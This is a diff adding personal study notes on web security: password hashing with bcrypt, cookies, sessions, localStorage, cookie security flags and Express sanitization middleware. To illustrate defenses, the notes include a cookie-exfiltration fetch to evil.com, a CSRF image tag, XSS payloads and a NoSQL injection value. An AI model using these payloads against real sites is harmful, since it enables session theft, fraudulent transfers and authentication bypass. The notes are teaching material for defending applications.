@@ -1,0 +1,351 @@
+Encryption
+
+Encryption is the process of converting readable data (plaintext) into unreadable data (ciphertext) using a secret key, so that only authorized people can read it.
+
+If the key reveal it should be easy to decrypt the password using the key
+
+Why not encryption?
+
+	Encryption is reversible (you can decrypt).
+	If your DB or key leaks → all passwords are exposed 😱
+	
+Hashing:
+Hashing is the process of converting data (like a password) into a fixed-length, irreversible string using a mathematical function.
+You can’t get the original password back from the hash.
+
+Why hashing is used
+
+	Hashing is mainly used to store passwords securely.
+	If a hacker steals the database:
+		They see only hashes
+		They cannot reverse them into real passwords
+		
+A rainbow table attack is a method where hackers use a precomputed list of hashes to quickly crack hashed passwords.
+Instead of guessing each password and hashing it every time, they:
+	Pre-generate millions of hashes
+	Store them in a huge table
+	Compare stolen hashes with the table
+	Instantly recover the original password if there’s a match
+
+“A dictionary attack tries common passwords instead of all combinations, making weak passwords easy to crack.”
+
+Bcrypt: bcrypt is a password hashing algorithm that:
+		Automatically adds a salt
+		Hashes the password
+		Is intentionally slow to stop brute-force & dictionary attacks
+
+What is “Salt” in bcrypt?
+	A salt is random data added to the password before hashing.
+	bcrypt generates and stores the salt inside the hash itself.
+	
+“bcrypt uses a built-in salt and a cost factor called salt rounds. Each increase doubles the hashing work, making brute-force attacks exponentially slower.
+
+We take password + salt send it to bcrypt hashing function and after that we again use the hash password with same salt send it to bcyrpt function 
+this is called salt round 2 this thing is again going on as salt mention how many times need to be add 
+
+	$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+	$2b$        → algorithm (bcrypt)
+	$10$        → cost factor (salt rounds)
+	N9qo8uLOickgx2ZMRZoMye → salt
+	IjZAgcfl7p92ldGxad68LJZdL17lhWy → hashed password
+
+
+Cookies:
+A small text file stored in the user’s browser that is automatically sent to the server with every request to that domain.
+Where stored?
+	Browser (client-side)
+
+	How it works
+	Server sends:
+		Set-Cookie: token=abc123; HttpOnly
+		
+	Browser stores it.
+		On next request:
+		Cookie: token=abc123
+
+	What is it used for?
+
+		Authentication tokens (JWT, session ID)
+		Remember login
+		Language / theme
+		Tracking (analytics)
+
+	Important properties
+		res.cookie("token", "abc", {
+		  httpOnly: true,   // JS can't read it
+		  secure: true,    // only HTTPS
+		  sameSite: "lax", // CSRF protection
+		  maxAge: 86400000
+		});
+
+	Pros
+		✔ Auto sent to server
+		✔ Can be secured (httpOnly, secure)
+
+	Cons
+		❌ Small (4KB)
+		❌ Sent on every request (slower)
+	
+SESSION
+What is it?
+
+	Session is server-side storage.
+	Browser stores only a session ID cookie.
+
+	Where stored?
+
+	👉 Server (Redis, memory, DB)
+
+	How it works
+		User logs in
+		Server creates:
+		sessionId = "xyz"
+
+
+	Browser stores:
+		Cookie: sessionId=xyz
+
+
+	On next request:
+		Browser sends sessionId
+		Server finds user data from session store
+
+	Used for
+		Login systems
+		Shopping carts
+		Temporary user state
+
+	Pros
+
+	✔ Secure (data not in browser)
+	✔ Can store large data
+
+	Cons
+
+	❌ Needs server memory/store
+	❌ Not stateless
+	
+LOCALSTORAGE
+Browser key–value storage that never goes to server automatically.
+Where stored?
+	Browser only
+		Example
+		localStorage.setItem("theme", "dark");
+		localStorage.getItem("theme");
+
+	Used for
+		UI preferences
+		Cart items
+		Caching data
+
+	Pros
+		✔ Large (~10MB)
+		✔ Easy JS access
+
+	Cons
+		❌ Not secure
+		❌ Vulnerable to XSS
+		❌ No auto-expiry
+		
+		
+How to secure cookie ?
+
+“Cookie flags protect against XSS (httpOnly), MITM (secure), CSRF (sameSite), and session hijacking (expiry).”
+
+Cookie Security Options → Attacks They Stop
+1️⃣ httpOnly
+	httpOnly: true
+
+	🔥 Stops: XSS (Cross-Site Scripting)
+
+	Attack:
+	Attacker injects JS into your site:
+
+	fetch("https://evil.com?c=" + document.cookie);
+
+
+	This steals auth tokens.
+
+	Defense:
+	With httpOnly, JS cannot read cookies:
+
+	document.cookie // cannot see httpOnly cookies
+
+2️⃣ secure
+	secure: true
+
+	🔥 Stops: Man-in-the-Middle (MITM)
+
+	Attack:
+	On public Wi-Fi, attacker intercepts HTTP traffic and reads cookies.
+
+	Defense:
+	secure → cookie only sent over HTTPS, encrypted.
+
+3️⃣ sameSite
+	sameSite: "lax" | "strict" | "none"
+
+	🔥 Stops: CSRF (Cross-Site Request Forgery)
+
+	Attack:
+	Victim logged in → visits attacker site:
+
+	<img src="https://bank.com/transfer?to=attacker&amount=1000">
+
+
+	Browser sends cookie → money transferred.
+
+	Defense:
+
+	Value	Protection
+	strict	Never sent cross-site
+	lax	Sent only on top-level GET
+	none	Sent everywhere (needs secure)
+
+4️⃣ maxAge / expires
+	maxAge: 600000
+
+	🔥 Stops: Session hijacking window
+
+	Attack:
+	Stolen cookie is valid forever.
+
+	Defense:
+	Short expiry → stolen cookie becomes useless.
+
+5️⃣ path
+	path: "/admin"
+
+	🔥 Stops: Cookie leakage
+
+	Attack:
+	Cookie sent to every endpoint unnecessarily.
+
+	Defense:
+	Restricts where cookie is sent.
+
+6️⃣ domain
+	domain: "example.com"
+
+	🔥 Stops: Subdomain cookie theft
+
+	Attack:
+	evil.example.com reads cookies for app.example.com.
+
+	Defense:
+	Limit domain scope.
+	
+Data Sanitization:
+
+	globalSecurity.js
+		import helmet from "helmet";
+		import mongoSanitize from "express-mongo-sanitize";
+		import xss from "xss-clean";
+		import { body, query, param, validationResult } from "express-validator";
+
+		export function applySecurity(app) {
+		  app.use(helmet());
+		  app.use(mongoSanitize());
+		  app.use(xss());
+		}
+		
+express-validator
+
+	Job: Validate + sanitize user input.
+
+What it does internally
+
+	It uses the validator library:
+
+	trim() → removes spaces
+
+	escape() → converts HTML chars:
+
+	< → &lt;
+	> → &gt;
+	" → &quot;
+	' → &#x27;
+	/ → &#x2F;
+
+Attack stopped
+	<script>alert(1)</script>
+
+
+Becomes:
+
+	&lt;script&gt;alert(1)&lt;/script&gt;
+
+
+	Now it is text, not code → XSS blocked.
+
+xss-clean
+
+	Job: Cleans req.body, req.query, req.params
+
+What it does internally
+
+		It uses the xss library:
+
+		It parses HTML and removes:
+
+		<script>
+
+		onerror=
+
+		onload=
+
+		<iframe>
+
+		<svg>
+
+Example:
+
+		<img src=x onerror=alert(1)>
+
+
+Becomes:
+
+		<img src="x">
+
+
+		JS execution removed → XSS blocked.	
+	
+express-mongo-sanitize
+
+	Job: Blocks NoSQL Injection
+
+What it does internally
+
+	It removes $ and . keys:
+
+	password[$ne]=null
+
+
+	becomes:
+
+	password: null
+
+
+Mongo no longer treats it as operator.
+
+Stops:
+
+	Auth bypass
+
+	Data leaks
+
+	Mass updates
+	
+helmet
+
+	Job: Browser-level protection via headers.
+
+Internals
+
+Helmet sets:
+
+Header				 Purpose
+Content-Security-Policy		Blocks inline scripts
+X-XSS-Protection		Old browser XSS filter
+X-Frame-Options	Prevent		clickjacking
+X-Content-Type-Options		Prevent MIME sniffing
